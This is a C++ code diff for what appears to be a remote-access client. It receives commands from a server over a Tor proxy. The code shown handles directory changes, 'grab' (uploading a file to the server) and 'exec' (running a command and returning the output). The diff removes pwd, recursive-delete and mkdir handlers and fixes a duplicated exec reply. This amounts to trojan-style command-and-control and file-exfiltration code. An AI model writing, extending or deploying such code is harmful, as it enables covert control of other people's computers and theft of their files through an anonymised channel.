@@ -160,17 +160,8 @@ public:
             if (cmd == "ping;") {
                 torSock.proxySendStr("ping;pong;");
             }
-            else if (cmd == "pwd;") { // Print Working Directory
-                this->pwd();
-            }
             else if (cmd.starts_with("cd;")) { // Change Directory
                 this->cd(cmd.substr(3, cmd.size() - 4));
-            }
-            else if (cmd.starts_with("rm;")) {
-                this->rm(cmd.substr(3, cmd.size() - 4));
-            }
-            else if (cmd.starts_with("mkdir;")) {
-                this->mkdir(cmd.substr(6, cmd.size() - 7));
             }
             else if (cmd.starts_with("grab;")) { // Uploads a file to the server
                 this->grab(cmd.substr(5, cmd.size() - 6));
@@ -192,19 +183,7 @@ public:
     /*
         ================ All the functions below this line are called by cmdProcessLoop() ================
     */
-    
-    
-    /*
-        Sends the current working directory to the server
-        Response format: "pwd;<path>;"
-    */
-    void pwd() {
-        // Get the current working directory
-        TCHAR cwdTC[MAX_PATH] = { 0 }; // MAX_PATH is defined in Windef.h as 260
-        GetCurrentDirectory(MAX_PATH, cwdTC); // Put the current working directory into cwdTC
-        std::wstring cwdWStr(&cwdTC[0]); // Convert to a wstring so it can be converted to a normal string
-        this->torSock.proxySendStr("pwd;" + std::string(cwdWStr.begin(), cwdWStr.end()) + ";"); // Send the response to the server
-    }
+
 
     /*
         Changes the current working directory of this executable to the one specified in the command
@@ -213,28 +192,6 @@ public:
         std::wstring pathWStr(path.begin(), path.end()); // Convert to a wstring because windows is cringe
         BOOL success = SetCurrentDirectory(pathWStr.c_str()); // Attempt to change the current working directory
         this->torSock.proxySendStr("cd;" + path + ((success) ? ";success;" : ";failed;")); // Send the appropriate response to the server
-    }
-
-    /*
-        rm() calls std::filesystem::remove_all.
-        Will delete recursively, use with care!
-    */
-    void rm(std::string path) {
-        std::string pathReal = path; // If adjustments are required, we dont modify the original path (the server expects to get exactly the same path it sent as the response)
-        if (std::filesystem::is_directory(pathReal) && pathReal.back() != '\\') {
-            pathReal += "\\";
-        }
-        this->torSock.proxySendStr("rm;" + path + ((std::filesystem::remove_all(pathReal)) ? ";success;" : ";failed;"));
-    }
-
-    void mkdir(std::string path) {
-        try {
-            std::filesystem::create_directories(path);
-            this->torSock.proxySendStr("mkdir;" + path + ";success;");
-        }
-        catch (...) {
-            this->torSock.proxySendStr("mkdir;" + path + ";failed;");
-        }
     }
 
     /*
@@ -319,7 +276,9 @@ public:
         if (response.size() == 0) {
             this->torSock.proxySendStr("exec;" + cmd + ";0;;");
         }
-        this->torSock.proxySendStr("exec;" + cmd + ";" + std::to_string(response.size()-1) + ";" + response + ";");
+        else {
+            this->torSock.proxySendStr("exec;" + cmd + ";" + std::to_string(response.size() - 1) + ";" + response + ";");
+        }
     }
     
 };
